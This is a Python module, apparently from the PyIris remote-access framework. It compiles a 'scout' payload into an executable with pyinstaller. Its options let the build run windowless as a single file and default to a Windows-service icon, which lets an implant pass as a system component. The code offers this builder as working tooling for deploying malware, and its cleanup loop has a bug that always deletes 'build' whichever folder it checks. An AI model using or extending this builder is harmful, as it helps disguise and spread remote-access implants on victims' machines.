# GUI + CUI
# done
import os
import shutil
import library.modules.config as config

config.main()
interface = config.interface
if interface == "GUI":
    from flask import jsonify
    import library.modules.log as log


def main(prompt=None):
    local_dir = os.getcwd()
    if os.name == 'nt':
        filename = 'payload.exe'
    else:
        filename = 'payload'
    if interface == "GUI":
        log.log_normal("Initiating compilation of scout : " + local_dir)
    elif interface == "CUI":
        print(config.inf + 'Initiating compilation of scout : ' + local_dir)
    tags = []
    if interface == "GUI":
        if prompt['onefile']:
            tags.append("--onefile")
        if prompt['windowed']:
            tags.append('--windowed')
        if prompt['custom_icon']:
            if os.path.exists(prompt['custom_icon_filepath']):
                log.log_normal("Custom .ico file found and loaded")
                tags.append('--icon ' + prompt['custom_icon_filepath'])
            else:
                log.log_warning("Custom .ico file not found")
                tags.append('--icon ' + os.path.join(config.started_at, 'resources', 'windows_service.ico'))
                log.log_normal("Default .ico file used")
        else:
            tags.append('--icon ' + os.path.join(config.started_at, 'resources', 'windows_service.ico'))
            log.log_normal("Default .ico file used")
    elif interface == "CUI":
        while True:
            option = input(config.pro + 'Compress compiled scout into one file? [y|n] : ')
            if option == 'y':
                tags.append('--onefile')
                break
            elif option == 'n':
                break
            else:
                continue
        while True:
            option = input(config.pro + 'Compile scout so that it runs without a window? [y|n] : ')
            if option == 'y':
                tags.append('--windowed')
                break
            elif option == 'n':
                break
            else:
                continue
        while True:
            option = input(config.pro + 'Use a custom file icon (.ico) for the compiled scout? [y|n] : ')
            if option == 'y':
                option = input(config.pro + 'Path to file ico or press [enter] to use the default PyIris provided windows service icon (resources/windows_service.ico) : ')
                if not option:
                    option = os.path.join(config.started_at, 'resources', 'windows_service.ico')
                tags.append('--icon ' + option)
                break
            elif option == 'n':
                break
            else:
                continue
    command = 'pyinstaller ' + ' '.join(tags) + ' payload.py'
    if interface == "GUI":
        log.log_normal("Removing residue folders...")
    elif interface == "CUI":
        print(config.inf + 'Removing residue folders...')
    for i in ['build', 'dist', '__pycache__']:
        if os.path.isdir(os.path.join(os.getcwd(), i)):
            shutil.rmtree('build')
    for i in os.listdir(os.getcwd()):
        if i.endswith('.spec'):
            os.remove(i)
    if interface == "GUI":
        log.log_normal("Compiling file...")
    elif interface == "CUI":
        print(config.inf + 'Compiling file...')
    os.system(command)
    # remove garbage dirs and copy compiled exe out of dist into the root//local_datetime folder
    if os.path.isdir(os.path.join(os.getcwd(), 'build')):
        shutil.rmtree('build')
    else:
        if interface == "GUI":
            log.log_error("Error, could not successfully compile scout (Is 'pyinstaller' installed and visible in your PATH?)")
            return jsonify({"output": "Fail", "output_message": "Error, could not successfully compile scout (Is 'pyinstaller' installed and visible in your PATH?)", "data": ""})
        elif interface == "CUI":
            print(config.neg + 'Error, could not successfully compile scout (Is "pyinstaller" installed and visible in your PATH?)')
            return
    if os.path.isdir(os.path.join(os.getcwd(), 'dist')):
        shutil.copy(os.path.join(os.getcwd(), 'dist', filename), os.path.join(os.getcwd(), filename))
        shutil.rmtree('dist')
        if interface == "GUI":
            log.log_normal('Successfully compiled single file scout to : ' + os.path.join(os.getcwd(), filename))
        elif interface == "CUI":
            print(config.pos + 'Successfully compiled single file scout to : ' + os.path.join(os.getcwd(), filename))

    else:
        if interface == "GUI":
            log.log_error(
                "Error, could not successfully compile scout (Is 'pyinstaller' installed and visible in your PATH?)")
            return jsonify({"output": "Fail", "output_message": "Error, could not successfully compile scout (Is 'pyinstaller' installed and visible in your PATH?)", "data": ""})
        elif interface == "CUI":
            print(config.neg + 'Error, could not successfully compile scout (Is "pyinstaller" installed and visible in your PATH?)')
            return
    if os.path.isdir(os.path.join(os.getcwd(), '__pycache__')):
        shutil.rmtree('__pycache__')
    for i in os.listdir(os.getcwd()):
        if i.endswith('.spec'):
            os.remove(i)
    if interface == "GUI":
        return jsonify({"output": "Success", "output_message": "Compilation and generation successful", "data": ""})